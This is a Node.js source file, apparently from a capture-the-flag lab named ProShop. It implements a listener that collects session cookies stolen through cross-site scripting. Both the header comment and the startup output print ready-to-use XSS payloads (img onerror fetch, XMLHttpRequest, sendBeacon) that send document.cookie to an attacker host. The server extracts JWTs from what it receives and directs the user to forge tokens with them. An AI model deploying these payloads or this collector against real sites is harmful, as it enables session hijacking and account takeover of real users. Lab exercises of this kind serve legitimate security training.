// =============================================================================
// ProShop CTF Lab — XSS Token Collector Server
// lab-tools/collector.js
//
// Run this on your attack machine BEFORE deploying the XSS payload.
// It listens for inbound requests containing the stolen JWT cookie
// exfiltrated from the admin bot's browser.
//
// Usage:
//   node collector.js [PORT]
//   Default port: 9000
//
// Then inject this XSS payload into a product review:
//
//   <img src=x onerror="fetch('http://ATTACKER_IP:9000/steal?c='+encodeURIComponent(document.cookie))">
//
// Or use the fetch-based beacon (more reliable, works around CSP in some cases):
//
//   <script>
//     var x=new XMLHttpRequest();
//     x.open('GET','http://ATTACKER_IP:9000/steal?c='+document.cookie);
//     x.send();
//   </script>
//
// Or via navigator.sendBeacon() (survives page unload):
//
//   <img src=x onerror="navigator.sendBeacon('http://ATTACKER_IP:9000/steal',JSON.stringify({c:document.cookie,u:location.href}))">
// =============================================================================

const http = require('http');
const url  = require('url');

const PORT = parseInt(process.argv[2]) || 9000;

const server = http.createServer((req, res) => {
  // Allow CORS for XSS cross-origin fetch requests
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  const parsed = url.parse(req.url, true);
  const path   = parsed.pathname;

  // ── GET /steal?c=<COOKIE> ──────────────────────────────────────────────────
  if (path === '/steal' && req.method === 'GET') {
    const cookie = parsed.query.c || '';
    const source = req.headers['referer'] || 'unknown';

    console.log('\n' + '='.repeat(70));
    console.log(`[${new Date().toISOString()}] 🍪 COOKIE STOLEN!`);
    console.log(`  From URL   : ${source}`);
    console.log(`  Client IP  : ${req.socket.remoteAddress}`);
    console.log(`  Cookie Raw : ${decodeURIComponent(cookie)}`);

    // Extract JWT value
    const jwtMatch = decodeURIComponent(cookie).match(/jwt=([^;]+)/);
    if (jwtMatch) {
      console.log(`\n  ⭐ JWT TOKEN: ${jwtMatch[1]}`);
      console.log('\n  → Copy the JWT above and paste into forge_token.js');
      console.log('  → Run: node lab-tools/forge_token.js --token="<JWT>"');
    }
    console.log('='.repeat(70));

    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('OK');
    return;
  }

  // ── POST /steal (beacon body) ──────────────────────────────────────────────
  if (path === '/steal' && req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => (body += chunk));
    req.on('end', () => {
      console.log('\n' + '='.repeat(70));
      console.log(`[${new Date().toISOString()}] 🍪 BEACON RECEIVED!`);
      console.log(`  Body: ${body}`);
      try {
        const parsed = JSON.parse(body);
        if (parsed.c) {
          const jwtMatch = parsed.c.match(/jwt=([^;]+)/);
          if (jwtMatch) {
            console.log(`\n  ⭐ JWT TOKEN: ${jwtMatch[1]}`);
          }
        }
      } catch {}
      console.log('='.repeat(70));
    });
    res.writeHead(200);
    res.end('OK');
    return;
  }

  // ── Health check ──────────────────────────────────────────────────────────
  if (path === '/' || path === '/health') {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end(`ProShop CTF Collector running on port ${PORT}\nWaiting for stolen tokens...\n`);
    return;
  }

  res.writeHead(404);
  res.end('Not Found');
});

server.listen(PORT, '0.0.0.0', () => {
  console.log('='.repeat(70));
  console.log(' ProShop CTF Lab — XSS Cookie Collector');
  console.log('='.repeat(70));
  console.log(`\n Listening on: http://0.0.0.0:${PORT}`);
  console.log('\n XSS Payload Templates:');
  console.log('\n [1] img onerror (simple):');
  console.log(`     <img src=x onerror="fetch('http://YOUR_IP:${PORT}/steal?c='+document.cookie)">`);
  console.log('\n [2] Fetch beacon (CSP bypass attempt):');
  console.log(`     <script>fetch('http://YOUR_IP:${PORT}/steal?c='+encodeURIComponent(document.cookie))</script>`);
  console.log('\n [3] sendBeacon (survives navigation):');
  console.log(`     <img src=x onerror="navigator.sendBeacon('http://YOUR_IP:${PORT}/steal',JSON.stringify({c:document.cookie,u:location.href}))">`);
  console.log('\n Waiting for admin bot to visit product page...\n');
});
